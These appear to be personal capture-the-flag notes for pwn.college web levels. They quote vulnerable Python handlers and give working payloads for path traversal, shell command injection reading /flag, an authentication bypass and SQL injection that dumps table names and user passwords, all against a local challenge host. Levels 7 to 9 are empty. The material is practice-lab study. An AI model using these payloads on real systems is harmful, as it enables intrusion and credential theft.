# Level 1 - Path Traversal Vulnerability


```{md}
def level1(): 
    path = request.args.get("path") 
    assert path, "Missing `path` argument" 
    return (pathlib.Path(app.root_path) / path).read_text() 
```

```{sh}
> curl "http://challenge.localhost/?path=/flag"
pwn.college{wRT8kGDQ5IlFvynfnRpcP0mOZ7h.01N4MzMsMTOwEzW}
```

# Level 2 - Command Injection Vulnerability

```{md}
def level2():
    timezone = request.args.get("timezone", "UTC")
    return subprocess.check_output(f"TZ={timezone} date", shell=True, encoding="latin")
```

```{sh}
> requests.get('http://challenge.localhost:80/?timezone=tmp;cat /flag;').text
```

# Level 3 - Exploit Authentication row number

```{sh}

Way 1: usinf first if [NO]
> curl -X POST "http://challenge.localhost:80/?username=flag&password=*"
 
Way 2: using 2nd if
> curl "http://challenge.localhost:80/?user=1"
```

# Level 4 - Exploit SQL where clause

```{python}
import requests

url = "http://challenge.localhost:80"
data = {
        "username": '" or 1=1--',
        "password": "tmp"
}

response = requests.post(url, data = data)

print(response.text)
```

# Level 5 - Closing SQL clause with LIKE and UNION

- if `requests.arg.get()`, use `requests.post(url, params=data)`


```{python}
import requests

url = "http://challenge.localhost:80"
data = {
        "query": '"UNION SELECT password FROM users --"'
}

response = requests.post(url, params=data)

print(response.text)
```

# Level 6 - 

We don't know table name, so we have to get it first


Step 1:
```{sh}
import requests

url = "http://challenge.localhost:80"
data = {
        'query': '"UNION SELECT name from sqlite_master--'
}

res = requests.post(url, params=data)
print(res.text)
```

> table15220250475541310597

Step 2:

```{sh}
data = {
        'query': '"UNION SELECT password from table15220250475541310597--'
}
```

# Level 7 - 



```{sh}

```


# Level 8 - 

```{sh}

```

# Level 9 - 

```{sh}

```


